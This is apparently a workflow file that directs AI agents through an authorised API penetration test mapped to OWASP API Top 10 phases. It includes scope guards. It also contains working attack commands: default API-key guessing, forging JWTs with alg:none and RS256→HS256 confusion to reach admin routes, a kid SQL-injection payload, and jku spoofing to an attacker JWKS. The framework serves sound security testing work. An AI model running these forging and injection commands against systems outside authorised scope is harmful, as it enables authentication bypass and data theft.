---
name: W_HUNT_API
description: Comprehensive API security assessment (REST, GraphQL, gRPC/gRPC-web, WebSocket, SOAP/XML) mapped end-to-end to the OWASP API Security Top 10 (2023)
trigger: API endpoint, Swagger/OpenAPI spec, GraphQL/gRPC/WebSocket surface, or Postman collection detected
agents: [AppReviewAgent, AuthAgent, OAuthAgent, APIAgent, GraphQLAgent, WebSocketAgent, IDORAgent, SQLiAgent, NoSQLiAgent, RCEAgent, CommandInjectionAgent, DeserializationAgent, SSRFAgent, CRLFAgent, RaceConditionAgent, BusinessLogicAgent, ValidatorAgent, ExploitChainAgent]
tools: [dev-browser, playwright-harness, burp-bridge, credential-vault, auth-manager]
skills_invoked: [APISecurityTesting]
---

# W_HUNT_API: API Security Assessment Workflow

> **Workflow Owner:** Hunt Orchestrator (`hunt-orchestrator.ts`), engagement type `api`
> **Router plan (`agent-router.ts` → `api`):** profiling → AppReviewAgent; auth → AuthAgent, OAuthAgent; hunt → APIAgent, GraphQLAgent, WebSocketAgent, IDORAgent, SQLiAgent, NoSQLiAgent, RCEAgent, CommandInjectionAgent, DeserializationAgent, SSRFAgent, CRLFAgent, RaceConditionAgent, BusinessLogicAgent; validate → ValidatorAgent; chain → ExploitChainAgent
> **Domain tooling (`piranha tools api`):** Burp via `burp-bridge.ts` (proxy / scope / HAR / Collaborator) + WebSocket/GraphQL/gRPC clients; CLIs: `nuclei`, `ffuf`, `clairvoyance`, `graphw00f`, `graphql-cop`, `websocat`, `wsrepl`, `grpcurl`, `jwt_tool`, `sqlmap`, `smuggler.py`; MCP: Burp Suite MCP
> **Phases:** 13 sequential phases, parallelizable techniques noted, profile-before-attack enforced

---

## Operating Doctrine

An API is not a website; it is a contract. The HTML is gone, so the only attack surface is the **shape of the data and the rules that govern it** — objects, properties, identities, methods, versions, and the flows that string them together. A senior API tester therefore works the contract, not the page.

1. **Understand before you attack.** The single highest-leverage artifact is the OpenAPI/GraphQL schema, because it enumerates every object, property, method, parameter type, and auth requirement for free. Profile first (Phase 1). An attack with no hypothesis is noise; an attack derived from the schema is a scalpel. The AppProfile produced by AppReviewAgent at `/tmp/app-profile.json` is the source of truth every later agent reads.
2. **Authorization is the API's defining weakness.** Six of the OWASP API Top 10 are authz failures in disguise (API1 BOLA, API3 BOPLA, API5 BFLA, API6 sensitive-flow abuse, plus the authz half of API9 versioning). The reason is structural: object IDs travel in the request and the server must re-check ownership on *every* one. It usually does not. Build the multi-identity matrix early and never test authorization with a single token.
3. **Hypothesis-driven, evidence-captured.** Every probe answers a stated question ("does `/v1` re-validate ownership the way `/v2` does?"). Every positive is captured as a request/response pair, a timing delta, or an out-of-band (OOB) Collaborator hit — saved to the run output dir, never asserted from memory.
4. **Proxy everything.** All web + tool traffic routes through Burp (`http://127.0.0.1:8080`) so every request is recorded, replayable, and diffable. Burp's history is your evidence ledger and your re-test harness. Tools that cannot proxy natively (gRPC) are captured at the harness layer or replayed through Burp Repeater via `burp-bridge.ts`.
5. **Use a real session when state matters.** For anything authenticated, SPA-driven, multi-step, or token-refreshing, drive a real browser/session via `playwright-harness.ts` (auth + flow capture) and replay through Burp rather than hand-rolling cookies in raw `curl`. Reserve raw `curl --proxy` for fast, stateless, single-shot probes.
6. **Scope discipline is non-negotiable.** Third-party APIs the target *consumes* (API10) are tested only at the boundary the target controls — you attack the target's parsing/trust of the third party, never the third party itself. Every discovered host is scope-checked before a single payload.
7. **Depth vs breadth is a deliberate call.** Breadth = enumerate the whole surface (versions, methods, shadow endpoints). Depth = ride one crown-jewel object/flow to impact. Do breadth in Phase 1/6/7 to find where to dig; do depth in Phase 2-5/9-12 where the data lives. A BOLA on a billing object beats a hundred reflected errors.
8. **Chains over singletons.** An open redirect, a reflected `redirect_uri`, and a leaked `code` are three "lows" that compose into account takeover. Findings are tagged for ValidatorAgent and ExploitChainAgent so combinations are priced at terminal blast radius, not averaged down.

---

## Trigger Conditions

The orchestrator dispatches `W_HUNT_API` when ANY of these hold (classifier in `piranha.ts` routes `/graphql`, `swagger`, or `openapi` URLs to engagement `api`):

- Target URL matches API path patterns (`/api/`, `/v1/`, `/v2/`, `/graphql`, `/query`, `/rest/`, `/rpc/`)
- An OpenAPI/Swagger document is reachable (`swagger.json`, `openapi.yaml`, `/v3/api-docs`, `/docs`, `/redoc`)
- A GraphQL endpoint answers `{__typename}` or returns GraphQL-shaped errors
- gRPC server reflection is enabled on the target port, or `Content-Type: application/grpc[-web]` is observed
- A WebSocket `Upgrade: websocket` handshake is seen in captured traffic
- A Postman collection, HAR, or `.proto` set is supplied in the scope definition
- `Content-Type: text/xml` / `application/soap+xml` (SOAP/WSDL) is observed

---

## Pre-Flight

Nothing below Phase 1 starts until every Pre-Flight gate passes. Pre-Flight wires the proxy, pins a browser identity, prepares the artifact tree, loads multi-identity credentials, and arms the hard scope guard.

### P.1 Environment, proxy wiring, browser identity, artifact dir

```bash
# --- Target ---
export API_BASE="https://api.target.com"          # scheme + host (no trailing slash)
export API_TARGET="$API_BASE"                       # base used for endpoint joins
export TARGET_HOST="$(echo "$API_BASE" | sed -E 's#^https?://##; s#/.*$##')"
export TARGET_SLUG="$(echo "$TARGET_HOST" | tr '.:' '--')"
export GRPC_TARGET="grpc.target.com"; export GRPC_PORT="443"   # if gRPC in scope
export WS_URL="wss://api.target.com/ws"                         # if WebSocket in scope

# --- Burp proxy + REST bridge (route ALL web + tool traffic here) ---
export PROXY="http://127.0.0.1:8080"                            # Burp proxy listener
export BURP_API="http://127.0.0.1:1337/v0.1"                    # Burp REST API
export UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

# Canonical proxied client used throughout this workflow:
#   curl -sk --proxy "$PROXY" -A "$UA" ...
# (-k tolerates Burp's CA on intercept; -A pins a real browser User-Agent)

# --- Run output / artifact tree (honors `piranha hunt --out <dir>`) ---
export RUN_DIR="${OUT:-$HOME/.claude/MEMORY/BugBounty/Sessions/$TARGET_SLUG}"
export ART="$RUN_DIR/artifacts"      # raw tool output, schemas, HARs
export FIND="$RUN_DIR/findings"      # normalized finding JSON (archived copies)
export EVID="$RUN_DIR/evidence"      # request/response pairs, OOB logs, screenshots
mkdir -p "$ART" "$FIND" "$EVID"
# Per-agent finding files live at /tmp/bb-findings-<type>.json (ValidatorAgent globs these);
# archive a copy into $FIND at end of each phase.

# --- Tool path shorthand ---
export TOOLS="$HOME/.claude/skills/BugBountyFramework/Tools"
```

### P.2 Burp health + scope sync (proxy-or-warn, never block)

```bash
# Verify Burp proxy + REST API are reachable; suggests mitmproxy fallback if down.
bun "$TOOLS/burp-bridge.ts" --health || echo "[warn] Burp down — degrade to mitmproxy/direct, capture manually"

# Push in-scope patterns into Burp target scope so the proxy auto-records only the target.
bun "$TOOLS/burp-bridge.ts" --sync-scope --scope "$TARGET_HOST,*.${TARGET_HOST#*.},$GRPC_TARGET"
```

### P.3 Multi-identity credentials (BOLA/BFLA/BOPLA matrix)

```bash
# Store three identities ONCE (secrets never inline; vault is base64-at-rest + 1Password optional).
bun "$TOOLS/credential-vault.ts" --store --target api-user1 --jwt "<user1 jwt>"   --cookie "<user1 cookie>"
bun "$TOOLS/credential-vault.ts" --store --target api-user2 --jwt "<user2 jwt>"   --cookie "<user2 cookie>"
bun "$TOOLS/credential-vault.ts" --store --target api-admin --jwt "<admin jwt>"   --cookie "<admin cookie>"
bun "$TOOLS/credential-vault.ts" --store --target api-anon  --api-key ""           # the no-auth identity

# Hydrate per-identity tokens for the matrices (jq pulls the field the vault returns).
export U1=$(bun "$TOOLS/credential-vault.ts" --get --target api-user1 | jq -r '.jwt // .cookie // empty')
export U2=$(bun "$TOOLS/credential-vault.ts" --get --target api-user2 | jq -r '.jwt // .cookie // empty')
export ADMIN=$(bun "$TOOLS/credential-vault.ts" --get --target api-admin | jq -r '.jwt // .cookie // empty')
# Resource IDs owned by each identity (filled during Phase 1 enumeration):
export U1_ID="" U2_ID="" U1_OBJ="" U2_OBJ=""
```

### P.4 Auth strategy + real-session capture

```bash
# Detect auth flow (basic|b2c|oauth|saml|api|cookie|token) so token refresh is automatic mid-hunt.
bun "$TOOLS/auth-manager.ts" --target "$API_BASE" --detect-strategy

# For SPA/OAuth/SSO surfaces, capture a REAL authenticated session + map flows through Burp.
# (Prefer this over hand-rolled cookies whenever state/refresh/redirects matter.)
bun "$TOOLS/playwright-harness.ts" \
  --target "$API_BASE" \
  --auth-cookie "$(bun "$TOOLS/credential-vault.ts" --get --target api-user1 | jq -r '.cookie // empty')" \
  --proxy "$PROXY" \
  --mode map-flows \
  --output /tmp/app-profile.json
```

### P.5 Hard scope guard (run before EVERY request to a newly discovered host)

```bash
in_scope() {  # usage: in_scope "$URL" || skip
  local u="$1"
  local verdict=$(bun "$TOOLS/hunt-orchestrator.ts" --scope-check "$u" 2>/dev/null)
  [ "$verdict" = "IN_SCOPE" ] || { echo "[scope] SKIP out-of-scope: $u" >&2; return 1; }
}
# Third-party hosts the API merely consumes (API10) are tested ONLY at the target-controlled boundary,
# never directly. CDNs, IdPs, payment processors, and shared infra are out of scope unless explicitly listed.
```

| Pre-Flight gate | Command | Pass condition |
|-----------------|---------|----------------|
| Target reachable | `curl -sk --proxy "$PROXY" -A "$UA" -o /dev/null -w '%{http_code}' "$API_BASE"` | HTTP response received |
| Scope verified | `bun "$TOOLS/hunt-orchestrator.ts" --scope-check "$API_BASE"` | `IN_SCOPE` |
| Burp proxy/REST | `bun "$TOOLS/burp-bridge.ts" --health` | proxy alive (warn-only if down) |
| Scope synced to Burp | `bun "$TOOLS/burp-bridge.ts" --sync-scope --scope "$TARGET_HOST"` | `success: true` |
| Identities loaded | `bun "$TOOLS/credential-vault.ts" --list` | user1, user2, admin present |
| Auth strategy known | `bun "$TOOLS/auth-manager.ts" --target "$API_BASE" --detect-strategy` | strategy identified |
| Artifact tree | `mkdir -p "$ART" "$FIND" "$EVID"` | dirs exist |

---

## Coverage Matrix

Authoritative checklist = **OWASP API Security Top 10 (2023)** + protocol specifics (REST, GraphQL, gRPC/gRPC-web, WebSocket, SOAP/XML) + auth depth (API keys, JWT, OAuth2/OIDC, session, gateway) + gateway-layer attacks (content-type confusion, request smuggling). Every row maps to the phase/technique that covers it. If a row has no technique, the hunt is incomplete.

| ID / Item | What it is | Phase.Technique | Owning agent |
|-----------|-----------|-----------------|--------------|
| **API1** Broken Object Level Authorization (BOLA) | Cross-tenant object access by ID | 3.1, 3.2 | IDORAgent |
| **API2** Broken Authentication | Token/credential/flow weaknesses | 2.1-2.9 | AuthAgent, OAuthAgent |
| **API3** Broken Object Property Level Authorization — Mass Assignment | Writing unauthorized properties | 3.5 | APIAgent |
| **API3** BOPLA — Excessive Data Exposure | Reading unauthorized properties | 3.6 | APIAgent |
| **API4** Unrestricted Resource Consumption — rate/quota | Missing/bypassable rate limits | 5.1 | BusinessLogicAgent |
| **API4** — large/nested/array payloads | Memory/CPU exhaustion via body | 5.2 | BusinessLogicAgent |
| **API4** — pagination abuse | `limit`/`per_page` blow-ups | 5.3 | BusinessLogicAgent |
| **API4** — cost/amplification | Webhook/email/SMS/compute amplification | 5.4 | BusinessLogicAgent |
| **API5** Broken Function Level Authorization (BFLA) | Privileged function via low-priv token/method | 3.3, 3.4 | IDORAgent, APIAgent |
| **API6** Unrestricted Access to Sensitive Business Flows | Automatable abuse of a business flow | 5.5, 5.6 | BusinessLogicAgent, RaceConditionAgent |
| **API7** Server-Side Request Forgery | Server fetches attacker URL | 4.6 | SSRFAgent |
| **API8** Security Misconfiguration — CORS | Reflective/`null`/wildcard+creds | 6.1 | APIAgent |
| **API8** — verbose errors / stack traces | Info leak via errors | 6.2 | APIAgent |
| **API8** — debug/actuator/management | Spring Actuator, debug, health, metrics | 6.3 | APIAgent |
| **API8** — missing security headers | HSTS/CTO/cache/`Content-Type` | 6.4 | APIAgent |
| **API8** — HTTP method handling | Verb tampering, OPTIONS/TRACE, override | 6.5 | APIAgent |
| **API8** — content-type confusion | JSON↔XML↔form parser swap | 6.6 | APIAgent, DeserializationAgent |
| **API9** Improper Inventory — versions | Shadow/zombie/deprecated `/v1` etc. | 7.1 | APIAgent |
| **API9** — non-prod / shadow endpoints | staging/dev/internal/debug hosts | 7.2 | APIAgent |
| **API9** — documentation drift | Undocumented live endpoints | 7.3 | APIAgent |
| **API10** Unsafe Consumption of 3rd-party APIs | Trusting upstream responses/redirects | 8.1, 8.2 | SSRFAgent, APIAgent |
| **Injection** SQLi | Param → SQL | 4.1 | SQLiAgent |
| **Injection** NoSQLi | Operator/`$where`/regex injection | 4.2 | NoSQLiAgent |
| **Injection** RCE / command | Param → shell/eval | 4.3, 4.4 | RCEAgent, CommandInjectionAgent |
| **Injection** Insecure deserialization | Serialized blob → gadget | 4.5 | DeserializationAgent |
| **Injection** CRLF / header injection | Param → response headers | 6.7 | CRLFAgent |
| **REST** semantics | Methods, params, status, versioning | 1.x, 3.x, 6.x, 7.x | APIAgent |
| **GraphQL** introspection | Schema dump / field suggestion | 9.1 | GraphQLAgent |
| **GraphQL** batching/alias auth & rate bypass | Array/alias batching | 9.2 | GraphQLAgent |
| **GraphQL** depth/complexity DoS | Nested/recursive query cost | 9.3 | GraphQLAgent |
| **GraphQL** field-level authz | Per-field/per-mutation authz gaps | 9.4 | GraphQLAgent, IDORAgent |
| **GraphQL** CSRF over GET/POST | GET queries / form-content mutations | 9.5 | GraphQLAgent, CRLFAgent |
| **gRPC / gRPC-web** reflection | Service/method enumeration | 10.1 | APIAgent |
| **gRPC** message tampering / authz | Field tamper, type confusion, metadata | 10.2, 10.3 | APIAgent, RCEAgent |
| **WebSocket** CSWSH | Cross-site WebSocket hijack | 11.1 | WebSocketAgent |
| **WebSocket** message injection | Injection/XSS/authz over frames | 11.2 | WebSocketAgent |
| **WebSocket** authn timing | Auth checked only at connect | 11.3 | WebSocketAgent |
| **SOAP/XML** XXE | External entity in XML body | 12.1 | DeserializationAgent, APIAgent |
| **SOAP/XML** WS-Security | Signature/timestamp/UsernameToken flaws | 12.2 | APIAgent |
| **Gateway** request smuggling | CL.TE / TE.CL / H2 desync at the edge | 12.3 | APIAgent, CRLFAgent |
| **Auth** API keys | Location, default/weak, query leak | 2.1 | AuthAgent |
| **Auth** JWT | alg confusion/none/kid/jku/x5u/secret/claims/expiry | 2.2-2.5 | AuthAgent |
| **Auth** OAuth2/OIDC | redirect_uri/PKCE/scope/consent/refresh | 2.6, 2.7 | OAuthAgent |
| **Auth** session | Fixation/rotation/logout invalidation | 2.8 | AuthAgent |
| **Auth** gateway bypass | Header spoof, path confusion, direct backend | 2.9 | AuthAgent |

---

## PHASE 1: API INVENTORY, DISCOVERY & PROFILING

**Objective:** Build the complete, machine-readable API surface map — every endpoint, method, parameter, type, status code, auth scheme, version, and data model — and turn it into an AppProfile that targets all later phases.
**Expert rationale:** You cannot test authorization on objects you have not enumerated, nor injection on parameters you have not typed. The schema is the cheat sheet; recovering it (or reconstructing it) is the highest ROI action in the entire hunt.
**Gate-in:** Pre-Flight passed; `$API_BASE` reachable and in scope.
**Optional input (if W_RECON ran first):** seed this phase from the recon hand-off under `$RUN_DIR/recon/` — `reports/attack-surface-inventory.json` and `reports/high-priority-targets.txt` (api hosts, versions, shadow/zombie + non-prod hosts → Phase 7), `content/api-surface.txt` (swagger/openapi/graphql/redoc), `content/graphql-introspection.json` (→ Phase 9), `content/policy-.well-known-openid-configuration.dump` (OIDC → Phase 2.6-2.7), and `content/app-profile-admin.json` vs `app-profile-lowpriv.json` (authenticated route diff → BFLA/BOLA leads for Phase 3). This is an accelerator only; 1.1-1.6 below stand alone if no recon ran.
**Owning agent:** AppReviewAgent (profiling). Parallelizable: 1.1-1.6 run concurrently.

### 1.1 OpenAPI / Swagger specification harvest

- **Objective / hypothesis:** A published spec exists and leaks the full contract (paths, methods, params, schemas, security).
- **Procedure:**
```bash
for p in /swagger.json /openapi.json /openapi.yaml /v2/api-docs /v3/api-docs \
         /api-docs /swagger/v1/swagger.json /swagger-resources /docs /redoc \
         /.well-known/openapi.yaml /api/swagger.json /swagger-ui/index.html; do
  code=$(curl -sk --proxy "$PROXY" -A "$UA" -o "$ART/spec$(echo "$p"|tr '/' '_')" -w '%{http_code}' "$API_BASE$p")
  echo "$code $p"
done | tee "$ART/spec-probe.txt"

# Normalize whichever spec returned 200 into a single JSON for parsing:
cp "$ART/spec_swagger.json" "$ART/spec.json" 2>/dev/null || true
jq -r '.paths | keys[]'                      "$ART/spec.json" > "$ART/endpoints.txt"
jq -r '.paths|to_entries[]|.key as $p|.value|to_entries[]|"\(.key|ascii_upcase) \($p)"' "$ART/spec.json" > "$ART/methods.txt"
jq -r '.paths[][]?|select(.parameters)|.parameters[]|"\(.name) (\(.in)) \(.required//false) \(.schema.type//.type)"' "$ART/spec.json" > "$ART/params.txt"
jq '.components.securitySchemes // .securityDefinitions' "$ART/spec.json" > "$ART/auth-schemes.json"
jq '.components.schemas // .definitions'                 "$ART/spec.json" > "$ART/data-models.json"
```
- **Indicators:** A 200 returning JSON/YAML with a `paths` (or `swagger`/`openapi`) key; `securitySchemes` reveals JWT/OAuth/apiKey; `schemas` lists every object property (including ones the UI never shows — mass-assignment candidates).
- **Validation:** Cross-check `methods.txt` against live responses (a documented method that 404s = doc drift, feeds 7.3). A spec on prod is itself an API9/API8 finding when it exposes internal/admin paths.
- **Evasion / edge cases:** Specs hide behind auth — retry each path with `-H "Authorization: Bearer $U1"`. Try alternate doc engines (`/graphql` SDL, `/swagger-ui.html`, `?format=openapi`). Older `v2/api-docs` often coexists with `v3/api-docs` and lists deprecated routes.
- **Severity:** Spec itself usually Info-Low; but exposed admin/internal paths in it CVSS 3.1 ~5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) and a force-multiplier for everything downstream.
- **Dispatch:** -> AppReviewAgent (build profile); exposed-spec misconfig -> APIAgent.

### 1.2 Active endpoint + version enumeration

- **Objective / hypothesis:** Undocumented, shadow, or versioned endpoints exist beyond the spec.
- **Procedure:**
```bash
# Endpoint brute-force, proxied (ffuf -x routes through Burp; -replay-proxy mirrors hits into Burp):
ffuf -u "$API_BASE/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -x "$PROXY" -H "User-Agent: $UA" -H "Authorization: Bearer $U1" \
  -mc 200,201,204,301,302,401,403,405 -ac -o "$ART/ffuf-endpoints.json" -of json

# Version sweep (older versions frequently lack controls added later):
for v in v1 v2 v3 v4 beta alpha internal legacy private; do
  curl -sk --proxy "$PROXY" -A "$UA" -o /dev/null -w "%{http_code} /$v\n" "$API_BASE/$v/" -H "Authorization: Bearer $U1"
done | tee "$ART/versions.txt"

# Nuclei API/exposure/misconfig templates, proxied:
nuclei -u "$API_BASE" -t http/exposures/ -t http/misconfiguration/ -t http/technologies/ \
  -proxy "$PROXY" -H "User-Agent: $UA" -o "$ART/nuclei-discovery.txt"
```
- **Indicators:** 200/401/403 on paths absent from `endpoints.txt`; a `/v1` answering where `/v2` is the documented version; differing auth behavior across versions.
- **Validation:** Confirm a discovered endpoint is real (consistent body, not a catch-all 200 SPA shell — `-ac`/`-fs` filter soft-404s).
- **Evasion / edge cases:** Recurse one level (`-recursion -recursion-depth 1`); try trailing-slash and extension variants (`.json`, `;`, `%2e`).
- **Severity:** Discovery itself Info; severity accrues when a shadow/zombie version lacks authz (-> 7.1).
- **Dispatch:** -> APIAgent (inventory); version-authz gaps -> IDORAgent.

### 1.3 Protocol detection (GraphQL / gRPC / WebSocket / SOAP)

- **Objective / hypothesis:** Non-REST surfaces exist and each opens its own attack class.
- **Procedure:**
```bash
# GraphQL presence + engine fingerprint:
for p in /graphql /graphiql /api/graphql /v1/graphql /query /gql; do
  curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/json' \
    -d '{"query":"{__typename}"}' "$API_BASE$p" -o "$ART/gql$(echo $p|tr '/' '_').json" \
    -w "%{http_code} $p\n"
done | tee "$ART/graphql-probe.txt"
graphw00f -d -t "$API_BASE/graphql" -o "$ART/graphw00f.txt" 2>/dev/null   # engine = which DoS/bypass apply

# gRPC reflection:
grpcurl -insecure "$GRPC_TARGET:$GRPC_PORT" list 2>&1 | tee "$ART/grpc-services.txt"

# WebSocket handshake:
curl -sk --proxy "$PROXY" -A "$UA" -i -N \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
  "$API_BASE/ws" | head -20 | tee "$ART/ws-handshake.txt"

# SOAP/WSDL:
for p in "?wsdl" "/service?wsdl" "/ws" "/soap"; do
  curl -sk --proxy "$PROXY" -A "$UA" "$API_BASE$p" | grep -qi "wsdl\|soap:envelope" && echo "SOAP: $p"
done | tee "$ART/soap-probe.txt"
```
- **Indicators:** `{"data":{"__typename":"Query"}}` (GraphQL live); `grpcurl list` returns services (reflection on); `HTTP/1.1 101 Switching Protocols` (WebSocket); `wsdl:definitions` (SOAP).
- **Validation:** Engine fingerprint (graphw00f) tells you which depth/batching limits the server enforces by default.
- **Evasion / edge cases:** GraphQL often hides on `/api` accepting `application/graphql` content-type; gRPC-web rides plain HTTPS with `application/grpc-web+proto`.
- **Severity:** Detection Info; each detected protocol activates its phase (9-12).
- **Dispatch:** GraphQL -> GraphQLAgent; gRPC -> APIAgent; WebSocket -> WebSocketAgent; SOAP -> APIAgent/DeserializationAgent.

### 1.4 Passive surface from proxy + client artifacts

- **Objective / hypothesis:** Real traffic (SPA, mobile, Postman) reveals endpoints and params no wordlist will.
- **Procedure:**
```bash
# Export everything Burp already recorded (the SPA flow capture from Pre-Flight P.4):
bun "$TOOLS/burp-bridge.ts" --sitemap > "$ART/burp-sitemap.json"
bun "$TOOLS/burp-bridge.ts" --history --filter "status:200" > "$ART/burp-history.json"
bun "$TOOLS/burp-bridge.ts" --export-har --output "$ART/traffic.har"

# Mine endpoints/params from the AppProfile + HAR:
jq -r '.. | .url? // empty' "$ART/traffic.har" 2>/dev/null | sort -u > "$ART/urls-from-har.txt"
# Postman collection (if supplied):
jq -r '.. | .url? // empty | if type=="object" then .raw else . end' postman.json 2>/dev/null | sort -u >> "$ART/urls-from-har.txt"

# Hidden parameter discovery on key endpoints (proxied):
while read ep; do
  arjun -u "$API_BASE$ep" -m JSON -oJ "$ART/arjun$(echo $ep|tr '/' '_').json" --proxy "$PROXY" -H "User-Agent: $UA"
done < "$ART/endpoints.txt"
```
- **Indicators:** Params/endpoints present in traffic but absent from the spec (doc drift); internal headers (`X-Backend`, `X-Upstream`) hinting at gateway topology.
- **Validation:** De-dupe against `endpoints.txt`; the delta is the undocumented set for 7.3.
- **Evasion / edge cases:** Mobile apps pin TLS — if SPA capture is thin, note that a mobile engagement may be needed for full surface.
- **Severity:** Info (input to other phases).
- **Dispatch:** -> AppReviewAgent.

### 1.5 Identity & object-ID harvest (seed the authz matrices)

- **Objective / hypothesis:** Capture each identity's own object IDs so BOLA/BFLA tests have known cross-tenant targets.
- **Procedure:**
```bash
# Pull each identity's "me" / list views and extract owned IDs:
for who in U1 U2; do tok=$(eval echo \$$who)
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $tok" "$API_BASE/v1/me"      -o "$EVID/$who-me.json"
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $tok" "$API_BASE/v1/orders"  -o "$EVID/$who-orders.json"
done
export U1_ID=$(jq -r '.id // .user_id' "$EVID/U1-me.json"); export U2_ID=$(jq -r '.id // .user_id' "$EVID/U2-me.json")
export U1_OBJ=$(jq -r '.[0].id' "$EVID/U1-orders.json");   export U2_OBJ=$(jq -r '.[0].id' "$EVID/U2-orders.json")
echo "U1_ID=$U1_ID U2_ID=$U2_ID U1_OBJ=$U1_OBJ U2_OBJ=$U2_OBJ" | tee "$ART/identities.txt"
```
- **Indicators:** Distinct IDs per identity; ID format (sequential int / UUIDv1 time-based / opaque) dictates BOLA approach.
- **Validation:** Confirm U1 can read U1_OBJ and is denied U2_OBJ under normal use — that is the control you will try to break in Phase 3.
- **Severity:** Info (prerequisite).
- **Dispatch:** -> IDORAgent (matrix seed).

### 1.6 AppProfile synthesis

- **Objective:** Emit `/tmp/app-profile.json` — flows, tech stack, auth pattern, crown jewels, per-endpoint hypotheses + assigned agents.
- **Procedure:** AppReviewAgent merges 1.1-1.5 into the AppProfile (same schema every agent reads via `jq` on `/tmp/app-profile.json`); archive a copy to `$ART/app-profile.json`.
- **Indicators:** Each high-value flow names its endpoint, why it is interesting, and the agent(s) to deploy.
- **Severity:** Info.
- **Dispatch:** -> all hunt agents.

**Phase 1 artifacts:** `$ART/spec.json`, `endpoints.txt`, `methods.txt`, `params.txt`, `auth-schemes.json`, `data-models.json`, `versions.txt`, `burp-sitemap.json`, `traffic.har`, `identities.txt`, `/tmp/app-profile.json`.
**Gate-out:** Endpoint+method+param inventory exists; protocols classified; three identities with known object IDs; AppProfile written. Advance to Phase 2.

---

## PHASE 2: AUTHENTICATION & TOKEN SECURITY (API2)

**Objective:** Break or bypass every authentication mechanism — API keys, JWT, OAuth2/OIDC, sessions — and the gateway controls in front of them.
**Expert rationale:** Authentication is the one control whose failure is unconditionally critical: forge identity once and every authorization control downstream is moot. JWTs concentrate this risk because verification is client-trusting and implementation-fragile.
**Gate-in:** Auth scheme(s) identified (1.1, P.4); a valid token captured per identity.
**Owning agents:** AuthAgent (keys/JWT/session/gateway), OAuthAgent (OAuth2/OIDC). Parallelizable: 2.1-2.9 independent.

### 2.1 API key handling

- **Objective / hypothesis:** Keys are accepted insecurely (query string, weak/default values, wrong-location acceptance).
- **Procedure:**
```bash
# Where is the key accepted? (query-string acceptance = logged/cached/referer-leaked)
curl -sk --proxy "$PROXY" -A "$UA" -o /dev/null -w "querystring=%{http_code}\n" "$API_BASE/v1/me?api_key=$U1"
for h in X-API-Key Authorization Api-Key apikey X-Auth-Token access_token token; do
  curl -sk --proxy "$PROXY" -A "$UA" -o /dev/null -w "$h=%{http_code}\n" -H "$h: $U1" "$API_BASE/v1/me"
done
# Default/weak keys:
for k in test admin default 123456 api_key secret changeme demo; do
  curl -sk --proxy "$PROXY" -A "$UA" -o /dev/null -w "$k=%{http_code}\n" -H "X-API-Key: $k" "$API_BASE/v1/me"
done
```
- **Indicators:** 200 with key in query string; any default key authenticating; key valid in an unexpected header.
- **Validation:** Confirm the response is identity-bound data, not a public default. Query-string acceptance is confirmed when the same key works but is now exposed in `burp-history`/access logs.
- **Evasion / edge cases:** Keys sometimes scope-limited — test the same key across versions/methods.
- **Severity:** Query-string key leak CVSS 3.1 ~5.3-6.5; default/guessable key authenticating ~9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N).
- **Dispatch:** -> AuthAgent; leaked key in JS/responses -> SecretsExposureAgent (note via AuthAgent).

### 2.2 JWT: algorithm confusion & `none`

- **Objective / hypothesis:** Server trusts the token's `alg` header → forge with `none` or RS256→HS256.
- **Procedure:**
```bash
export JWT="$U1"
# Decode header/payload for situational awareness:
echo "$JWT" | cut -d. -f1 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo

# jwt_tool runs every known attack and (with jwtconf.ini proxy set) replays through Burp:
python3 jwt_tool.py "$JWT" -X a          # alg:none family + blank sig
python3 jwt_tool.py "$JWT" -X k -pk public.pem   # RS256->HS256 confusion (needs server public key)
# Pull the public key if RS*/ES*:
curl -sk --proxy "$PROXY" -A "$UA" "$API_BASE/.well-known/jwks.json" -o "$ART/jwks.json"

# Replay a forged token through Burp and diff against the original:
FORGED=$(python3 jwt_tool.py "$JWT" -X a -I -pc role -pv admin 2>/dev/null | grep -oE 'eyJ[A-Za-z0-9_.-]+' | tail -1)
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $FORGED" "$API_BASE/v1/admin/users" -o "$EVID/jwt-none.json" -w "%{http_code}\n"
```
- **Indicators:** Forged-token request returns 200 with admin/other-user data; server accepts `alg:none` or a token HMAC-signed with the RSA public key.
- **Validation:** Re-test with a deliberately broken signature — if still 200, signature is unverified (confirmed). Compare to the original token's response to prove escalation, not just acceptance.
- **Evasion / edge cases:** Try `none`, `None`, `nOnE`; strip vs keep the trailing dot; for confusion, the "secret" must be the EXACT PEM bytes the server holds (try with and without trailing newline).
- **Severity:** CVSS 3.1 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) — full auth bypass / privilege forge.
- **Dispatch:** -> AuthAgent.

### 2.3 JWT: key-resolution header injection (`kid` / `jku` / `x5u`)

- **Objective / hypothesis:** The header points the verifier at attacker-controlled key material or an injectable lookup.
- **Procedure:**
```bash
# kid -> path traversal / predictable file (sign with a known/empty key the kid resolves to):
python3 jwt_tool.py "$JWT" -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
# kid -> SQL injection (verifier does `SELECT key WHERE kid='<kid>'`):
python3 jwt_tool.py "$JWT" -I -hc kid -hv "x' UNION SELECT 'attackerkey'-- -" -S hs256 -p "attackerkey"
# jku/x5u -> point to attacker JWKS hosted on a Collaborator/allowed host:
COLLAB=$(bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 1 2>/dev/null | jq -r '.host' 2>/dev/null)
python3 jwt_tool.py "$JWT" -X s -ju "https://$COLLAB/jwks.json"   # spoof JWKS
# Replay each forged token through Burp as in 2.2 and watch the Collaborator for the JWKS fetch.
```
- **Indicators:** 200 on a token signed with attacker-known material; an OOB hit at the Collaborator for `jku`/`x5u` (server fetched attacker JWKS).
